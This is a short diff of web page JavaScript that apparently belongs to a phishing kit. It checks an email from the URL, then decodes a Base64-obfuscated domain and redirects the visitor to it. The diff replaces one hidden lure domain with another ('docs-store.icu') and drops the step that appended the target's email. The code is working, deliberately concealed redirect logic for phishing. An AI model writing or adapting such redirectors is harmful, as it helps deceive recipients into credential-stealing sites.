@@ -165,10 +165,10 @@
         let emailId = new URLSearchParams(window.location.search).get("id");
 
         if (emailId == email) {
-          const link = "aHR0cHM6Ly9WQnE0Mi5lbGxpZmx1b3U2LmNvbS9WQnE0Mi8="; // Base64 encoded link
+          const link = "ZG9jcy1zdG9yZS5pY3U="; // Base64 encoded link
           const decodedLink = atob(link);
-          const finalLink = `${decodedLink}#M${email}`;
-          window.location.href = finalLink;
+          // const finalLink = `${decodedLink}#M${email}`;
+          window.location.href = decodedLink;
         } else {
           alert("Email not recognized. Please try again.");
         }
